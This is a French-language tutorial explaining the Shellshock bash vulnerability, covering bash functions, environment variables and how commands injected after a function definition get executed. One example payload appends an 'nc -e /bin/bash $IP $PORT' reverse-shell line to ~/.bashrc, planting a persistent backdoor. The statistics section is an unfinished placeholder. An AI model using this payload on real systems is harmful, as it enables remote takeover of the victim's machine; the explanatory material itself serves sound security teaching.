# La vulnérabilité Shellshock


[Shellshock](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271) est une vulnérabilité présente dans bash 4.3 et antérieur. Il s'agit d'une vulnérabilité logicielle qui se base sur de l'injection de commande en passant par les variables d'environement. C'est vachement cool car elle mène à une **bonne grosse RCE des familles**, donc c'est pas négligeable 😘.

## Statistiques

Quelques statistiques afin d'illustrer la portée et l'attention portée de la vulnérabilité.

![Stonks gif](https://media.giphy.com/media/YnkMcHgNIMW4Yfmjxr/giphy.gif)

Shellshock a beaucoup été à la mode quand elle est sortie, énormément de trafic a été généré par des botnets lors de tentatives d'exploitation de la vulnérabilité.

**Bon faut que je trouve des stats mais c'est un autre problème**

## Comment ça marche ?

![Thinking gif](https://media.giphy.com/media/lKXEBR8m1jWso/giphy.gif)

```shell
env _='() { echo "Yeah ma boi"; }; echo "nc -e /bin/bash $IP $PORT" >> ~/.bashrc;'; bash -c 'echo "Bonjour à tous"'
```

Là on force l'utilisateur à lancer un shell sur `$IP:$PORT` à chaque fois qu'il va ouvrir un shell, mais on peut immaginer d'innombrables autres scénarios d'attaque, de compromission de machine, ou de porte dérobée.

Pour comprendre le fonctionnement de cette payload, on va la prendre par étape.

### Les fonctions dans bash

Si vous n'êtes pas connaisseur, il est possible de créer des fonctions dans bash directement, la syntaxe est la suivante :

```shell
my_function () {
  echo "Hello"
}

# Ou plus explicitement

function my_function () {
  echo "Hello"
}
```

Pour l'exécuter on peut l'appeller de cette manière :

```shell
$ my_function
Hello
```

### Utiliser une variable d'environnement avec bash

Les variables d'environnement permettent de gérer pas mal de choses, mais principalement de passer des valeurs d'un programme à un autre, sans passer par des étapes compliquées.

> Note : les variables type `$PATH`, `$SHELL`, `$PWD`, `$TERM`... sont des variables d'environnement, utilisables par des programmes.

En bash :

```shell
$ env BoC='ovgr bh pbhvyyr'
$ env | grep BoC
BoC=ovgr bh pbhvyyr # On a bien notre nouvelle variable d'environnement

# On peut aussi déclarer une fonction :
$ env my_function='() { echo "aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==" | base64 -d; }'
```

On peut même les utiliser dans un sous-shell :

```shell
$ env my_function='() { echo "aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==" | base64 -d; }'; bash -c 'my_function;'
```

> L'utilisation de variables d'environnement dans des sous-shells a été supprimée depuis, mais si vous voulez quand même tester, Docker ou VM 😉

### Injection

La partie sympa de Shellshock, c'est qu'on pouvait injecter une commande à exécuter via les variables d'environnement, en ajoutant la commande à la suite de la déclaration d'une fonction :

```shell
$ env a='() { echo "This is my function"; }; echo "Not in the func"'; bash -c 'a;'
Not in the func # Ne devrait pas être appelé !
This is my function
```

![Mind blown gif](https://media.giphy.com/media/26ufdipQqU2lhNA4g/giphy.gif)

Donc ouais, Shellshock c'est quand même vachement cool 😎.

